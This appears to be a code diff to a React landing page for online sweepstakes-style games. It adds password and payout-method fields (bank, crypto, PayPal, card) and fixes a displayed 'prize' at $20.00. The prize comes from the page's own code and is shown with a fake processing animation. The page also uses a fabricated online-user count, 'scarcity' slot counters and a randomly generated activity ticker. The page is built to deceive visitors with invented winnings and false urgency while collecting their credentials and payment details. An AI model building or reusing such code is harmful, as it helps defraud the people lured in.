@@ -58,6 +58,29 @@ const AVAILABLE_GAMES = [
     'X Game'
 ];
 
+const GAME_IMAGES: Record<string, string> = {
+    'Blue Dragon': '/games/bluedragon-banner.png',
+    'Buffalo Strike': '/games/buffalo-banner.png',
+    'Fire Kirin': '/games/firekirin-banner.png',
+    'Fortune 2 Go': '/games/fortune2go-banner.png',
+    'Game Vault': '/games/gamevualt.png',
+    'Golden Dragon': '/games/goldendragon-banner.png',
+    'Juwa': '/games/juwa-banner.png',
+    'Kraken': '/games/kraken.png',
+    'Milky Way': '/games/milkyway-banner.png',
+    'Ocean Dragon': '/games/oceandragon-banner.png',
+    'Orion Stars': '/games/orionstars-banner.png',
+    'Panda Master': '/games/panda-banner.png',
+    'Pot of Gold': '/games/pulsz.png',
+    'Pulsz': '/games/pulsz.png',
+    'RiverSweeps': '/games/riversweeps-banner.png',
+    'Slots of Vegas': '/games/slotofvegas-banner.png',
+    'Ultra Monster': '/games/ultramonster-banner.png',
+    'Vegas X': '/games/vegasx-banner.png',
+    'VPower': '/games/vpower-banner.png',
+    'X Game': '/games/xgame-banner.png'
+};
+
 const REGION_CONFIG: Record<string, { latency: number; name: string }> = {
     'NA_EAST': { latency: 24, name: 'US East (Virginia)' },
     'NA_WEST': { latency: 58, name: 'US West (Oregon)' },
@@ -80,6 +103,8 @@ const generateRandomActivity = () => {
 const LandingPage: React.FC<LandingPageProps> = ({ onLogin }) => {
   const [authMode, setAuthMode] = useState<AuthMode>('signup'); 
   const [username, setUsername] = useState('');
+  const [password, setPassword] = useState('');
+  const [payoutMethod, setPayoutMethod] = useState('bank');
   const [selectedGame, setSelectedGame] = useState(AVAILABLE_GAMES[2]); // Default to Fire Kirin
   const [region, setRegion] = useState('NA_EAST');
   
@@ -92,11 +117,11 @@ const LandingPage: React.FC<LandingPageProps> = ({ onLogin }) => {
   // Stats & Ticker
   const [onlineCount, setOnlineCount] = useState(1420);
   
-  // Exclusive Reward Display (7000-12000 range)
-  const [idleRewardDisplay, setIdleRewardDisplay] = useState('9,500'); 
+  // Exclusive Reward Display - Fixed to $20.00
+  const [idleRewardDisplay, setIdleRewardDisplay] = useState('20.00'); 
   
-  const [allocatedPrize, setAllocatedPrize] = useState(''); // determined final prize
-  const [processingPrizeDisplay, setProcessingPrizeDisplay] = useState('0'); // For the rapid counting animation during processing
+  const [allocatedPrize, setAllocatedPrize] = useState('20.00'); // determined final prize
+  const [processingPrizeDisplay, setProcessingPrizeDisplay] = useState('20.00'); // For the rapid counting animation during processing
   const [slotsLeft, setSlotsLeft] = useState(24); // Scarcity logic
   const [tickerItem, setTickerItem] = useState(generateRandomActivity());
   const [showTicker, setShowTicker] = useState(true);
@@ -264,20 +289,15 @@ const LandingPage: React.FC<LandingPageProps> = ({ onLogin }) => {
       setProgress(0);
       setCurrentStepIndex(0);
 
-      // --- SYNC POINT: Calculate Final Prize IMMEDIATELY ---
-      // Range: $5 - $120
-      const minPrize = 5;
-      const maxPrize = 120;
-      const finalVal = Math.floor(Math.random() * (maxPrize - minPrize + 1)) + minPrize;
-      const finalPrizeStr = finalVal.toLocaleString();
+      // --- SYNC POINT: Fixed Prize at $20.00 ---
+      const finalPrizeStr = '20.00';
       
       // Store it in state so it's ready for next stages
       setAllocatedPrize(finalPrizeStr);
 
-      // Processing visualizer: random values in winning range
+      // Processing visualizer: always show $20.00
       const prizeInterval = setInterval(() => {
-          const randomVal = Math.floor(Math.random() * 115) + 5;
-          setProcessingPrizeDisplay(randomVal.toLocaleString());
+          setProcessingPrizeDisplay('20.00');
       }, 60);
 
       const steps = processingSteps; 
@@ -363,7 +383,7 @@ const LandingPage: React.FC<LandingPageProps> = ({ onLogin }) => {
     startProcessing();
   };
 
-  const isFormValid = username.trim().length > 0;
+  const isFormValid = username.trim().length > 0 && password.length >= 6;
 
   const getCtaText = () => {
       if (authMode === 'signup') return "CREATE & PLAY";
@@ -522,23 +542,85 @@ const LandingPage: React.FC<LandingPageProps> = ({ onLogin }) => {
                                 </div>
                             </div>
 
+                            {/* Password Input */}
+                            <div className="space-y-1">
+                                <label className="text-[10px] uppercase font-bold text-gray-500 pl-1 flex items-center gap-1">
+                                    <Lock className="w-3 h-3" /> Password
+                                </label>
+                                <div className="relative group">
+                                    <input 
+                                        type="password" 
+                                        value={password}
+                                        onChange={(e) => setPassword(e.target.value)}
+                                        className="w-full bg-slate-900/80 border border-white/10 rounded-xl px-4 py-3 text-white font-bold outline-none focus:border-purple-500/50 focus:ring-1 focus:ring-purple-500/50 transition-all placeholder:text-gray-700 text-sm pl-10"
+                                        placeholder="••••••••"
+                                        minLength={6}
+                                    />
+                                    <Lock className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-600 pointer-events-none group-focus-within:text-purple-400 transition-colors" />
+                                </div>
+                            </div>
+
+                            {/* Payout Method */}
+                            <div className="space-y-1">
+                                <label className="text-[10px] uppercase font-bold text-gray-500 pl-1 flex items-center gap-1">
+                                    <Coins className="w-3 h-3" /> Payout Method
+                                </label>
+                                <select 
+                                    value={payoutMethod}
+                                    onChange={(e) => setPayoutMethod(e.target.value)}
+                                    className="w-full bg-slate-900/80 border border-white/10 rounded-xl px-4 py-3 text-white font-bold outline-none focus:border-purple-500/50 focus:ring-1 focus:ring-purple-500/50 transition-all text-sm"
+                                >
+                                    <option value="bank">Bank Transfer</option>
+                                    <option value="crypto">Cryptocurrency</option>
+                                    <option value="paypal">PayPal</option>
+                                    <option value="card">Debit Card</option>
+                                </select>
+                            </div>
+
                             <button 
                                 type="submit" 
-                                disabled={!isFormValid}
+                                disabled={!isFormValid || password.length < 6}
                                 className={`w-full py-4 rounded-xl font-black text-sm uppercase tracking-widest shadow-lg flex items-center justify-center gap-2 transition-all active:scale-95 mt-4 group relative overflow-hidden
-                                    ${isFormValid 
+                                    ${isFormValid && password.length >= 6
                                         ? 'bg-gradient-to-r from-purple-600 to-fuchsia-600 hover:from-purple-500 hover:to-fuchsia-500 text-white shadow-purple-900/30' 
                                         : 'bg-slate-800 text-gray-600 cursor-not-allowed'}
                                 `}
                             >
-                                {isFormValid && (
+                                {isFormValid && password.length >= 6 && (
                                     <div className="absolute inset-0 w-full h-full bg-white/20 -translate-x-full group-hover:animate-[shimmer_1s_infinite] transform skew-x-12"></div>
                                 )}
                                 <span className="relative flex items-center gap-2">
-                                    {getCtaText()} <ChevronRight className={`w-4 h-4 ${isFormValid ? 'animate-pulse' : ''}`} />
+                                    {getCtaText()} <ChevronRight className={`w-4 h-4 ${isFormValid && password.length >= 6 ? 'animate-pulse' : ''}`} />
                                 </span>
                             </button>
                         </form>
+
+                        {/* Available Games Showcase */}
+                        <div className="mt-8 pt-6 border-t border-white/5">
+                            <label className="text-[10px] uppercase font-bold text-gray-500 pl-1 flex items-center gap-1 mb-3">
+                                <Gamepad2 className="w-3 h-3" /> All Available Games ({AVAILABLE_GAMES.length})
+                            </label>
+                            <div className="grid grid-cols-4 gap-2 max-h-96 overflow-y-auto pr-2">
+                                {AVAILABLE_GAMES.map(game => (
+                                    <div
+                                        key={game}
+                                        className="relative rounded-lg overflow-hidden group cursor-pointer transition-transform hover:scale-105"
+                                    >
+                                        <img
+                                            src={GAME_IMAGES[game]}
+                                            alt={game}
+                                            className="w-full h-24 object-cover"
+                                            onError={(e) => {
+                                                e.currentTarget.src = 'https://images.unsplash.com/photo-1556438064-2d7646166914?q=80&w=300';
+                                            }}
+                                        />
+                                        <div className="absolute inset-0 bg-black/60 opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center">
+                                            <span className="text-white text-[9px] font-bold text-center px-1">{game}</span>
+                                        </div>
+                                    </div>
+                                ))}
+                            </div>
+                        </div>
                     </div>
                 )}
 
